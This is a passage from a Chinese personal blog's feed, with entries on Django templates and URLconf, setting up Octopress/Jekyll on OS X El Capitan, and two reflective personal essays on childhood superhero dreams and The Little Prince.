<p>这种方法是正确的。</p>
<p><img src="http://ww1.sinaimg.cn/large/6aa09e8fjw1evgxf183vrj20zk12sqa3.jpg" alt="awesomesauce"></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[ Django 学习笔记2-- Templates ]]></title>
      <url>http://lexuslee.me/2015/11/16/2015-11-16-django-learning2/</url>
      <content type="html"><![CDATA[<p>虽然 Django 中 Html 可以直接硬编码到 Python 中，但是这种行为并不利于前端开发人员进行维护。所以 Django 有了<a href="http://liquidmarkup.org/" target="_blank" rel="external">流模板</a> ( Liquid Templates )。</p>
<h2 id="流模板基础"><a href="#流模板基础" class="headerlink" title="流模板基础"></a>流模板基础</h2><p>举个例子，下面这个模板大致含括了 Django 模板的几个特性。<br><a id="more"></a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">&#123;% raw %&#125;</div><div class="line">&#123;% load staticfiles %&#125;</div><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125;&#123;% endblock %&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Dear &#123;&#123; person_name &#125;&#125;,<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Thanks for placing an order from &#123;&#123; company &#125;&#125;. It's scheduled to ship on &#123;&#123; ship_date|date:"F J,Y " &#125;&#125;.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"></div><div class="line">    &#123;% if ordered_warranty %&#125;</div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Your warranty information will be included in the packaging.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Here are the items you've ordered: <span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></div><div class="line">    &#123;% for item in item_list %&#125;</div><div class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></div><div class="line">            &#123;&#123; item &#125;&#125;</div><div class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">    &#123;% endfor %&#125;</div><div class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></div><div class="line">    &#123;% else %&#125;</div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>You didnt order a warranty, so you're on your own when the products inevitably stop working. <span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    &#123;% endif %&#125;</div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Sincerely,<span class="tag">&lt;<span class="name">br</span> /&gt;</span>&#123;&#123; company &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>footer<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    &#123;% block footer %&#125;</div><div class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Thanks for visiting my site.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    &#123;% endblock %&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line">&#123;% endraw %&#125;</div></pre></td></tr></table></figure>
<p>看出，模板是基于 Html 的，事实上它就是保存成一个 .html 文件，它跟我们所看到的 html 的区别就在于多了一些由 <figure class="highlight plain"><figcaption><span>raw %&#125;&#123;&#123; &#125;&#125;&#123;% endraw %&#125;```括起来的变量以及由```&#123;% raw %&#125;&#123;% %&#125;&#123;% endraw %&#125;```括起来的模板标签，此外变量还通过过滤器 ```|```来对文本输出格式进行转换。而这里 ```&#123;% raw %&#125;&#123;&#123; &#125;&#125;&#123;% endraw %&#125;``` 里的变量相当于一个形参，真正显示出来的是在我们渲染模板的 Python 文件里所传给它的值。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">比如在下面的模板渲染代码里</div><div class="line"></div><div class="line">```python</div><div class="line">c = Context(&#123;&apos;person_name&apos;:&apos;LexusLee&apos;,</div><div class="line">			&apos;company&apos;: &apos;UESTC&apos;,</div><div class="line">			&apos;ship_date&apos;:datetime.date(2015,09,24),</div><div class="line">			&apos;ordered_warranty&apos;: False&#125;)</div></pre></td></tr></table></figure></p>
<p>那么模板中的 <figure class="highlight plain"><figcaption><span>最终显示的就是 ```LexusLee``` 。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">## 模板标签 </div><div class="line"></div><div class="line">1. ```&#123;% raw %&#125;&#123;% if variable %&#125; &#123;% else %&#125; &#123;% endif %&#125;&#123;% endraw %&#125;```用于判断变量 variable 是否为真，为真则执行 else 标签前的内容，否则执行 else 便签内的内容，跟大部分编程语言中的条件语句用法一致。</div><div class="line">2. 同理```&#123;% raw %&#125;&#123;% for %&#125; &#123;% endfor %&#125;&#123;% endraw %&#125;```的用法也和大部分编程语言中循环语句的用法一致。需要注意的是，每个 for 循环中还有一个成为```&#123;% raw %&#125;&#123;% forloop %&#125;&#123;% endraw %&#125;```的模板变量，这个变量能提示一些循环进度信息相关的属性，关于这个变量的详细统发可以参照[这一节](http://djangobook.py3k.cn/appendixF/)。</div><div class="line">3. ```&#123;% raw %&#125;&#123;% block content %&#125; &#123;% endblock %&#125;&#123;% endraw %&#125;```是用来处理[模板继承](http://djangobook.py3k.cn/appendixF/)和重载的标签，来避免重复和冗余的代码。比如上述的实例模板( base.html )中，我希望在多个文件中都能显示 footer ，而不需要重复编码，故在该模板中写了```&#123;% raw %&#125;&#123;% block footer %&#125;&#123;% endraw %&#125;```,而在另一个文件中只需要写 </div><div class="line">``` html</div><div class="line">&#123;% raw %&#125;</div><div class="line">&#123;% extends &quot;base.html&quot; %&#125;</div><div class="line">&#123;% block footer %&#125;</div><div class="line">&lt;a href=&quot;https://github.com/thehackercat&quot;&gt;Github&lt;/a&gt;</div><div class="line">&#123;% endblock %&#125;</div><div class="line">&#123;% endraw %&#125;</div></pre></td></tr></table></figure></p>
<p>这样所有的 footer 中都会有<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://github.com/thehackercat"</span>&gt;</span>Github<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>这行代码。而之前<code>{% block footer %} {% endblock %}</code>框中的代码将会被 overwrite ，也就是说<strong>对于重载模块，子模板可以重载这些部分，如果子模板不重载这些部分，则会按照默认的内容显示</strong>。</p>
<p>4.<code>{% load staticfiles %}</code>用来加载静态资源，比如加载 CSS 、 JS 等静态文件时会用到。</p>
<p>5.<code>{# #}</code> 用于注释。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[ Django 学习笔记1-- URLconf ]]></title>
      <url>http://lexuslee.me/2015/11/14/2015-11-14-django-learning1/</url>
      <content type="html"><![CDATA[<p><img src="https://scontent-nrt1-1.xx.fbcdn.net/hphotos-xfp1/t31.0-8/12186716_1082564598443763_5619412981167558277_o.jpg" alt="PRAY FOR PARIS "></p>
<p>今天好像巴黎有点乱，希望明天太阳还会照常升起。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Django 是一个由 Python 编写、开源并采用经典的 <a href="https://msdn.microsoft.com/en-us/library/ff649643.aspx" target="_blank" rel="external">MVC</a> 设计模式的 Web Full Stack 应用框架。</p>
<p>在 Django 中，控制器接受用户输入的部分由框架自行处理，所以 Django 里关注更多在模型( Model )、模板( Template )和视图( Views )，称为 MTV 模式。他们各自的职责如下：<br><a id="more"></a></p>
<ul>
<li>模型( Model )，数据存取层：处理与数据相关的所有事务，即如何存取、如何验证有效性、包含哪些行为以及数据之间的关系等。</li>
<li>模板( Template )，表现层：处理与表现相关的决定，即如何在页面或其他类型文档中进行显示。</li>
<li>视图( View )，业务逻辑层：存取模型及调取恰当模板的相关逻辑。模型与模板之间的桥梁。</li>
</ul>
<p>而 Django 的编译方式比较特别，他的 MVC 控制器部分由 URLconf 来实现。</p>
<h2 id="URLconf"><a href="#URLconf" class="headerlink" title="URLconf"></a>URLconf</h2><p>当我在 Django 中编写完视图要想将其路由要页面上时，我发现了 Django 的 URLconf 路由机制，他实现了为相应的视图函数路由到相应界面的映射功能，也就是说，当用户访问了 <figure class="highlight plain"><figcaption><span>时， Django 调用了视图 views.py 中的 hello () 函数。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">``` python </div><div class="line">from django.conf.urls import include, url</div><div class="line">from mysite.views import hello,current_datetime,hours_ahead,letter</div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">url(r&apos;^hello/$&apos;, hello),</div><div class="line">url(r&apos;^time/$&apos;, current_datetime),</div><div class="line">url(r&apos;^time/plus/(\d&#123;1,2&#125;)/	$&apos;,hours_ahead),</div><div class="line">]</div><div class="line">```	</div><div class="line"></div><div class="line">可以看出， URLconf 的路由是通过正则表达式来匹配一个完整的 hello 的 URL ，这样的话就可以保证 诸如 /hello/foo/ 等 URL 不会被匹配到。</div><div class="line">为了更深入了解 URLconf 路由的机制，我找到了类似的 [tornado](https://github.com/tornadoweb/tornado) 框架来对比。</div><div class="line"></div><div class="line">注意到在其中 web.py 文件中的第2964行开始的如下代码：</div><div class="line"></div><div class="line">``` python </div><div class="line">application = tornado.web.Application([</div><div class="line">	(r&quot;/&quot;, MainHandler),</div><div class="line">])</div><div class="line">http_server = tornado.httpserver.HTTPServer(application)</div><div class="line">http_server.listen(options.port)</div><div class="line">tornado.ioloop.IOLoop.current( ).start( )</div><div class="line">``` </div><div class="line">    </div><div class="line">可以看出 torando 现把一个路由表作为一个参数，传给 Application 类的构造函数，接着创建了一个实例，然后再把这个实例传递给 http_server 。那么当客户端发起``` get / ```请求的时候, http server 接收到这个请求，在路由表中匹配 url pattern ，最后交给 MainHandler 去处理。</div><div class="line"></div><div class="line">这个机制跟 Django 的 URLconf 是类似的，都是通过在 pattern 中匹配好对应的 url 接着传给处理器来负责从路由表中检索并路由。</div><div class="line"></div><div class="line">这种方法**松耦合**了 http server 层和 web application 层，从而让开发者可以专注于 web 应用的逻辑层，很好！  ：D</div><div class="line"></div><div class="line">## Django 如何处理请求</div><div class="line"></div><div class="line">所以了解过了 Django 的 URLconf 机制后，我开始思考他是如何处理请求的。</div><div class="line"></div><div class="line">我开启服务器后在地址栏中输入 ``` http://127.0.0.1:8000/time/plus/20/</div></pre></td></tr></table></figure></p>
<p><img src="http://thehackercat-hackercat.stor.sinaapp.com/urlconf1.png" alt="timeplus20"></p>
<p>然后花现处理路线如下：</p>
<ol>
<li><p>进来的请求转入 /time/plus/20/ .</p>
</li>
<li><p>Django 通过在 ROOT_URLCONF 配置来决定根 URLconf .</p>
</li>
<li><p>Django 在 URLconf 中的所有 URL 模式中，查找第一个匹配 /time/plus/20/ 的条目。</p>
</li>
<li><p>如果找到匹配，将调用相应的视图函数</p>
</li>
<li><p>如果没找到匹配，则返回相应的 Http 状态码 (如图)</p>
</li>
<li><p>视图函数返回一个HttpResponse</p>
</li>
<li><p>Django 转换 HttpResponse 为一个适合的 HTTP response ，以 Web page 显示出来</p>
</li>
</ol>
<p><img src="http://thehackercat-hackercat.stor.sinaapp.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202015-11-14%20%E4%B8%8B%E5%8D%889.27.45.png" alt="http_request"></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[使用Octopress搭建静态博客]]></title>
      <url>http://lexuslee.me/2015/11/09/2015-11-09-fix-the-datetime-bug/</url>
      <content type="html"><![CDATA[<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/spiderman.jpg" alt="Spiderman"></p>
<p>最近把个人博客搭好了，用了<a href="https://github.com/octopress/octopress" target="_blank" rel="external">Octopress</a>,一个基于 Jekyll 的集成开发工具。</p>
<p>原来 CSDN 的那个『骇客猫』弃坑了。</p>
<h2 id="安装和配置"><a href="#安装和配置" class="headerlink" title="安装和配置."></a>安装和配置.</h2><p>Octopress 的安装配置比较简单，是需要按照官网或者网上一些<a href="http://shengmingzhiqing.com/blog/setup-octopress-with-github-pages.html/" target="_blank" rel="external">教程</a>一步步走即可。<br><a id="more"></a></p>
<p>由于我在2015年10月1日更新了 OS X EI Capitan，新系统在权限设置上增加了 <a href="http://www.macworld.com/article/2948140/os-x/private-i-el-capitans-system-integrity-protection-will-shift-utilities-functions.html" target="_blank" rel="external">System Integrity Protection</a> (SIP) 来提高系统安全性并且在 System Library 的路径上作了修改，导致了一些安装 Jekyll 时出现的异常，罗列如下：</p>
<ol>
<li><p>如果你使用命令行 <code>$ gem install jekyll</code> 安装 Jekyll 时 遇到了如下问题：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ERROR:  While executing gem ... (Errno::EPERM) </div><div class="line">Operation not permitted - /usr/bin/jekyll</div></pre></td></tr></table></figure>
<p>辣么尝试使用 <code>$ sudo gem install -n /usr/local/bin/ jekyll</code> 从而有效地避开 EI Captian 中 rootless 用户的权限问题。<br>或者有更彻底的办法，在终端输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ export PATH=/usr/local/bin:$PATH</div></pre></td></tr></table></figure>
<p>这样会将原来 /usr/bin 的路径更改为 /usr/local/bin ，然后再进行安装，一劳永逸，但我不建议这么做。</p>
</li>
<li><p>如果你在进行上述操作时遇见了如下问题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">在命令行中输入 ```$ xcode-select —install```就可以安装了。</div></pre></td></tr></table></figure>
<p>辣么你应该没有安装 OS X developer tools ，安装后才能编译一些 ruby 的原生的拓展插件。<br>在命令行中输入 <figure class="highlight plain"><figcaption><span>xcode-select —install```就可以安装了。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">3. 如果你遇到了任何 Permission denied 的问题：</div><div class="line"></div><div class="line">   ```shell</div><div class="line">   ERROR:  While executing gem ... (Errno::EACCES)</div><div class="line">   Permission denied</div></pre></td></tr></table></figure></p>
<p>辣么在命令行之前加上 <code>$ sudo</code> 。</p>
</li>
</ol>
<h2 id="个性化修改"><a href="#个性化修改" class="headerlink" title="个性化修改"></a>个性化修改</h2><p>对于我的博客的个性化修改我主要做了以下三个：</p>
<ul>
<li>第三方主题：Octopress有很多<a href="https://github.com/imathis/octopress/wiki/3rd-Party-Octopress-Themes" target="_blank" rel="external">第三方主题</a>安装也很便捷。</li>
<li>插件安装：可以在 <code>/plugins</code> 目录下安装一些第三方插件，诸如 Disqus 评论系统、 Twitter 的时间线等。</li>
<li>样式修改：我在 <code>/sass/custom/_styles.scss</code> 中修改了字体、 blog 的行间距以及一些边边角角的地方。</li>
</ul>
<p>我使用了<strong>第三方主题</strong> cleanpress 她极简的风格很吸引我，但是这个主题有蛮多 bug 的。 </p>
<p>比如，在首页会遇见一个博客的 post 时间无法显示导致日历图标和目录图标重合的问题，如下所示：</p>
<p><img src="https://cloud.githubusercontent.com/assets/190438/8529829/37c7bc80-23d2-11e5-896b-61a6cd0fc590.png" alt="Date_format_bug"></p>
<p>经过一上午的 debug ，我发现了在 <code>/source/_includes/post/date.html</code> 第11行<br><code>date_formatted</code> 是没有声明 formatted 的格式的从而导致了无法显示。<br>故我将其替换成了 <code>date | date: &quot;%b %e, %Y&quot;</code> 然后就可以显示出 format 后的时间了。</p>
<p><img src="https://cloud.githubusercontent.com/assets/10649416/11036546/3078799a-8734-11e5-80c6-8460962bd945.png" alt="Date_format_bug_fixed"></p>
<p>还有在发布超过20字的标题的博客时，首页的相应博客处会出现样式错误， date_line 会与标题重叠在一起。<br>这两个 bug 我都已修复并提交了，在<a href="https://github.com/macjasp/cleanpress/pull/23" target="_blank" rel="external">这里</a>可以查看并修改。</p>
<p>我使用了<strong>第三方插件</strong> <a href="https://disqus.com/" target="_blank" rel="external">Disqus</a> 非常棒的评论系统，以及 <a href="https://dev.twitter.com/web/embedded-timelines" target="_blank" rel="external">Twitter Timeline</a> 也是非常棒的时光机插件。根据官网的教程很容易安装并使用。</p>
<p>接着我还修改了<strong>样式</strong>，其中把全局字体改成了谷歌和 Adobe 联合发布的 <strong>思源黑体</strong> ，漂亮得不像实力派。修改过程主要参考了<a href="http://www.uisdc.com/source-han-sans-webfont" target="_blank" rel="external">这篇文章</a>。其中每个不同的 Adobe 账户需要插入的是不同的 Typekit 代码( Adobe 会帮你自动生成代码)。但需要注意的是 Adobe Typekit 虽然不是免费服务，但也有免费方案可以选择，注册后有每月 25,000 次的浏览次数额度，对于一般个人 blog 或小型网站来说其实还算充裕（当然你也可以考虑付费升级，价格并不高 ：P ）。</p>
<h2 id="为什么是蜘蛛侠-？"><a href="#为什么是蜘蛛侠-？" class="headerlink" title="为什么是蜘蛛侠 ？"></a>为什么是蜘蛛侠 ？</h2><p>嗷，其实是这样的，熟悉我的人就知道，我个人是漫威巨粉，而先前我看到 cleanpress 的 demo 页是酱的图片我很喜欢，并且想起来<a href="http://marvel.com/news/movies/24062/sony_pictures_entertainment_brings_marvel_studios_into_the_amazing_world_of_spider-man" target="_blank" rel="external">蜘蛛侠要回归漫威了</a>, <del>再看绿箭我就节食5分钟！</del> 这就像苯宝宝又要回归已经弃坑的绿箭侠一样鸡冻。 </p>
<p><img src="http://1.im.guokr.com/DQq0wz6RNDAcEszKLQI4xJXatRcJXp-327H-__RyrwToAQAAlQEAAEpQ.jpg" alt="苯宝宝只想安静地装醇"></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[长颈鹿侠]]></title>
      <url>http://lexuslee.me/2015/05/16/2015-05-16-giraffe-man/</url>
      <content type="html"><![CDATA[<p><img src="http://ww1.sinaimg.cn/large/e05ea78cjw1es5gp39wftj20jg0ri75b.jpg" alt="fly to the moon"><br><strong>从小，我就想做英雄大侠。</strong></p>
<p><strong>长着翅膀，穿梭云雾间如探囊取物的那种。</strong><br><a id="more"></a></p>
<p>我幻想着，</p>
<p>有一天我能够被基因拼接后的老鹰咬一口，</p>
<p>白天老老实实上班，</p>
<p>晚上却化身老鹰侠。</p>
<p>戴上面具，</p>
<p>展开翅膀，</p>
<p>去消灭世界上所有的坏蛋。</p>
<p>于是老鹰侠兴高采烈地跑去告诉老爸这个想法。</p>
<p>老爸沉默了好久，才如梦初醒，</p>
<p>终于做出了回应。</p>
<p>他十分激动地顺手拿起了手边的书，</p>
<p>劈头盖脸地向老鹰侠打去，</p>
<p>边打还边说：</p>
<p>“你爹我文曲星转世，学没富五车，富辆皮卡还是有的，<br>靠着这张嘴打架也没输过谁，上能识天象闻天下，下能解鸡兔同笼奥数题，<br>不说是什么千秋万代的伟人，好歹也是黑夜中最耀眼的那颗星。<br>你老子我尚且不能当什么大侠，你小子跟我装什么逼！”</p>
<p>老爸一套招式行云流水不带喘精准无误地命中了我瘦弱的身躯。</p>
<p>当时我就懵逼了。</p>
<p>“你儿子我一颗红心向祖国，先不说牺牲了写作业的时间去打坏蛋，好歹也是单纯地希望着这个世界好人能得到褒<br>赏，坏人能受到仲裁。法律做不到的我来做。这种跨时代的vigilante思想，却受到了守旧派文曲星转世的打<br>压。悲哀！<br>哼╭(╯^╰)╮”</p>
<p>当然了，想归想。</p>
<p>在强权面前，</p>
<p>羁傲不逊的老鹰侠还是选择了低头。</p>
<p>带着书卷气的这顿揍最终还是抑制住了大脑的气血上涌。</p>
<p>然而这种气血上涌，</p>
<p>随着我年龄渐长，</p>
<p>越发演绎到极致。</p>
<p>我开始怀疑，</p>
<p>为什么有人会利用人类的善良来作为谋利的工具。</p>
<p>为什么有人会去折磨一些比自己弱小的生灵。</p>
<p>为什么有人能从看着别人受难中取乐。</p>
<p>我很不开心。</p>
<p>为什么善良的人应该承受比他人更多的痛楚，</p>
<p>而邪恶的人却可以嚣张跋扈逍遥自得。</p>
<p>我学会暴怒。</p>
<p>眼眶发红，咬牙切齿。</p>
<p>我想把坏人们都撕碎。</p>
<p>我要他们都知道痛苦总是平等传递的，</p>
<p>欺负任何生命都是不被允许的。</p>
<p>至少，</p>
<p>不被我允许！</p>
<p>我还是长大了啊。</p>
<p>我开始明白，做个基因拼接的超人，是比较不现实的 T.T</p>
<p>我开始偷偷学电工，画铠甲，</p>
<p>试图做个像钢铁侠那样的英雄。（是的，在我还不认识Tony Stark的时候，我就先有了做钢铁侠的想法了。）</p>
<p>刀枪不入，所向披靡。</p>
<p>任何装备的坏人都妄想阻止神装的我。</p>
<p>然而很不辛，</p>
<p>我的手稿最终还是被名侦探文曲星转世找着了。</p>
<p>我爸很快就明白了我的意图，</p>
<p>而我也直言不讳，</p>
<p>“我想制造个世界，那里只有好人活着，大家见面时点头微笑，不用武装，不用伪装。而我可以从人们清澈的眼神里看到折射的太阳光。他们偶尔抬头，发现这个世界依旧温软善良。”</p>
<p>我估计当时我爸听完肠子都悔青了，</p>
<p>“完了完了，一世英名就要毁在这臭小子手里了。”</p>
<p>因为当时老爸并没有再沉默，</p>
<p>他直接用数学卷抽了我一耳光。</p>
<p>“作业写完了吗？没写完画什么鸟人！”</p>
<p>我想，大概是他把我精心设计的</p>
<p><em>「宇宙无敌钛合金钢铁老鹰侠小虚大魔王一号」</em></p>
<p>当做了鸟人吧。</p>
<p>羞辱！大大的羞辱！</p>
<p>不能忍了！</p>
<p>于是，我奋起反抗，</p>
<p>强烈谴责老爸侮辱艺术，侮辱科技，侮辱未来。</p>
<p>而我老爸也是个精干的人，不逼逼，直接劈头盖脸一顿揍。</p>
<p>“你小子数学考成这样，你跟我谈科技，跟我谈教育面向现代化，面向世界，面向未来？！”</p>
<p>那一刻，</p>
<p>我突然获得了一种神祗般的平静。</p>
<p>我明白自己太弱了，</p>
<p>这个世界过分强势得太多了，</p>
<p>聪明人不该反复迎头而上。</p>
<p>至少，</p>
<p>不该再挨第三顿揍了。</p>
<p>所以，</p>
<p>我尝试慢慢把愤怒变为理解。</p>
<p>我理解这个世界，</p>
<p>理解一切循规蹈矩和荒腔走板，</p>
<p>一切汲汲营营和独辟蹊径。</p>
<p>如果可以的话，</p>
<p>也想跟他们称兄道弟，</p>
<p>这是最敏感的人的生存方式，</p>
<p>我知道它想要什么，</p>
<p>它想要一个识时务的俊杰，</p>
<p>可是我真的不想做。</p>
<p>我想做一个大侠，</p>
<p>像一阵风一样的大侠。</p>
<blockquote>
<p>我们坚持一件事情，并不是因为这样做了会有效果，而是坚信，这样做是对的。<br>                                                                               ——哈维尔</p>
</blockquote>
<p>这个答案在<a href="http://zhi.hu/THas" target="_blank" rel="external">知乎</a>上</p>
<p>获得了6928个赞。</p>
<p>而我曾经给这个回答点了个向下的箭头。</p>
<p>大概是我曾觉得，</p>
<p>有时候最能解决问题的方法，</p>
<p>不一定是对的，却是最有效的。</p>
<p>Vigilante 是不对的，但可能是最有效的。</p>
<p><strong>如果能做一个绝望但细润无声的生命体，</strong></p>
<p><strong>那我愿意接盘背锅。</strong></p>
<p>我想，大概是因为</p>
<p>我是一个间距很大的人，</p>
<p>永远无法在生活的漫漫长河里筛出那些温情闪光的瞬间来普渡众人。</p>
<p>我更像是行走的钢丝，</p>
<p>所到之处都是血案。</p>
<p>这种偏执一直持续到我前几天看了一个视频。</p>
<p>有那么一刻，</p>
<p>从一个男人的角度。</p>
<p>我觉得这个人帅毙了。</p>
<p>比蝙蝠侠，钢铁侠，蜘蛛侠，绿箭侠，老鹰侠都帅！</p>
<p>我突然找到了一种，</p>
<p>作为一个全然的自己，</p>
<p>去和这个世界平等的相处。</p>
<p>我既不能仲裁别人的生死，</p>
<p>别人也不能干扰我的心境。</p>
<p>我要像这个男人一样，</p>
<p>我暂时不想去当什么英雄大侠了。</p>
<p>我只想做个「鹿尤」一样的长颈鹿侠。</p>
<p>把阳光，微笑和温柔善良带给身边的人。</p>
<p>蝙蝠侠，钢铁侠，蜘蛛侠，绿箭侠，老鹰侠</p>
<p>他们也许能穿梭云雾间，</p>
<p>窥探云层中的奥秘。</p>
<p>他们有自己黑暗骑士的信条，</p>
<p>而我也有自己的理解和克制。</p>
<p>人们会欢呼于他们的招招致命的凌厉，轰隆作响的正义。</p>
<p>我却折服于他们对生命的谦卑的那一瞬。</p>
<p>他们公演一个神话，</p>
<p>而我，书写一个笑话，</p>
<p>奢求这个世界的微笑。</p>
<p>挺好。</p>
<p><img src="http://tc.sinaimg.cn/maxwidth.2048/tc.service.weibo.com/p/mmbiz_qlogo_cn/0c1b9fafeb853fdd5871eb86c4b02347.jpg" alt="鹿尤"></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[小王子与春天的熊]]></title>
      <url>http://lexuslee.me/2015/04/02/2015-11-23-little-prince-and-bear/</url>
      <content type="html"><![CDATA[<p><img src="http://jokerwang-blogpic.stor.sinaapp.com/original/f777064f36fd2b901fadbed0d3e9efab.jpg" alt="Litte prince"></p>
<p>小王子的星球上忽然绽放了一朵娇艳的玫瑰花。</p>
<p>在我没长牙前，我就知道，草是绿的，花是红的，眼泪是咸的，口水是黏的，漂亮阿姨上厕所是不能偷看的。</p>
<p>在我长牙约莫拾几朵玫瑰花之后，我开始明白，玫瑰是不能摘的，春天是追不到的。</p>
<p>只能追，不能到！<br><a id="more"></a></p>
<p>成都的春天鲜艳得很。</p>
<p>仿佛向整个天空泼上绿色的漆。</p>
<p>这也使玫瑰显得更加耀眼。</p>
<p>所以，小王子爱上这朵玫瑰，细心地呵护它。他以为，这是一朵唯一的花，只有他的星球上才有，其他的地方都不存在。</p>
<p>然而，玫瑰有刺，香水有毒。</p>
<p>当所有的女青年们一层腻子再一层粉盖住玻尿酸和肉毒杆菌微雕后的粉脸，闷几行code，写几首诗，拜读下冯<br>唐，再上微博刷个韩寒。</p>
<p>我开始发现，原来世界上有数百万朵这么完全一样的花儿。</p>
<p>这时，他才知道，他有的只是一朵普通的花。</p>
<p>然而，小王子并没有停止浇灌他的玫瑰花。</p>
<p>因为他知道，他星球上的那朵，仍然是独一无二的，他浇灌过它，用屏风保护过它，还倾听过它的哀怨自诩、它的孤单寂寞。</p>
<blockquote>
<p>It is the time you have wasted for your rose that makes your rose so important.<br>—- 小王子。</p>
</blockquote>
<p>小王子注定不是个沾满胭脂味的人。</p>
<p>我也不是。</p>
<p>因为我还要纠结<code>preg_match_all($rose，$spring,$you);</code> 会不会报错。</p>
<p>//『从 ‘春天’ 里抓取 一朵’玫瑰’，传回给 ‘你’；』</p>
<p>我还要担心明天自己能否调整呼吸气定神闲地跟食堂阿姨要个豆浆鸡蛋饼。</p>
<p>然后默默保佑自己 听到闹钟就起床，上课不睡觉，代码一遍过，不得颈椎病。</p>
<p>我远不如小王子那样潇洒，</p>
<blockquote>
<p>如果不能活得洒脱，那我选择活得机灵。<br>—- 小虚大魔王。</p>
<p>If I cant be dissolute, I prefer to die.<br>—- 不要碧莲的小虚大魔王。</p>
